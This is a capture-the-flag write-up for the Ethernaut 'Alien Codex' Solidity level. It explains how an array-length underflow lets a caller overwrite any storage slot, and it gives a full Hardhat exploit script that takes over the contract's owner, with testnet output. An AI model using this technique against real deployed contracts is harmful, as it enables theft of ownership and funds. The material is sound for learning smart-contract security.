---
title: Ethernaut #19 Alien Codex
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Alien Codex challenge writeup
---

## Alien Codex

### Challenge

You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help

* Understanding how array storage works
* Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
* Using a very `underhanded` approach


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

### Background

This challenge is actually something I have suggested and discussed with some friends after a HAM radio lecture a few days ago :)

Arrays are allocated in two different ways. There are fixed-length arrays and dynamic-length arrays. Fixed-length arrays allocate space as if each element in the array was a separate variable. Dynamic-length arrays on the other hand, work in a very different way. Dynamic-length arrays store the length of the array in the slot given, and then use the `keccak` hash of that slot number to point to the location of the array. Then the array is accessed in a consecutive fashion. The problem arrises when one realizes that the length value is just a number stored in the `array.length` variable and if it can be manipulated, an attacker could extend it and make the array overlap other stuff in storage and then potentially access it by indexing into the array. Since solidity version `0.6.0` the `array.length` is now treated as read only by the compiler, however it is **NOT** a constant. Manipulating the slot using some other technique could still change its value.

### Attack

In order to attack this challenge, we first need to extend the length of the array. This can be achieved usign an integer underflow vulnerability. This can be achieved by simply calling the `retract` function before adding anything to the array. This will underflow the integer and go from `0x0000000000000000000000000000000000000000000000000000000000000000` to `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`. In order to call the `retract` function we also need to call the `make_contact` function just to bypass the modifier check. Finally we can calculate the offset of the array start to the first slot (slot 0) and replace the item at that index with the attackers address using the `revise` function.

We could consider clearing the `contact` variable and even fixing the array length, but since its not required we wont be bothering with this.

* Call the `make_contact` function to bypass the modifier check
* Call the `retract` function to underflow the `length` variable
* Calculate the array starting point using `keccak(uint256(0x01))`
* Calculate the offset at which the array would wrap around
* Call the `revise` function to replace the array location at the calculated offset with the attackers address

#### alien-codex-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    alienCodexAddress = "0xEba61037dEdbcbdaFF55315B626cF7C06B8fFbf5";
    contract = await ethers.getContractAt("AlienCodex", alienCodexAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    console.log("Level address : " + contract.address)
    console.log("Contract owner: " + await contract.owner())

    // calculate start of array
    arrayStart = ethers.utils.keccak256(ethers.utils.hexZeroPad(0x01, 32))

    // calculate owner offset (slot 0) from start of array
    offset = ethers.BigNumber.from('0x10000000000000000000000000000000000000000000000000000000000000000').sub(ethers.BigNumber.from(arrayStart))
    offsetHex = ethers.utils.hexZeroPad(offset, 32)

    // bypass modifier check
    tx = await contract.connect(account).make_contact()
    receipt = await tx.wait()

    // underflow array length to access full space
    tx = await contract.connect(account).retract()
    receipt = await tx.wait()

    // replace owner by writing address to array at calculated offset
    tx = await contract.connect(account).revise(offsetHex, ethers.utils.hexZeroPad(account.address, 32))
    receipt = await tx.wait()
    
    console.log("Contract owner: " + await contract.owner())
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/alien-codex-solve.js --network rinkeby
Level address : 0xEba61037dEdbcbdaFF55315B626cF7C06B8fFbf5
Contract owner: 0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272
Contract owner: 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
```

### Success Message

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)
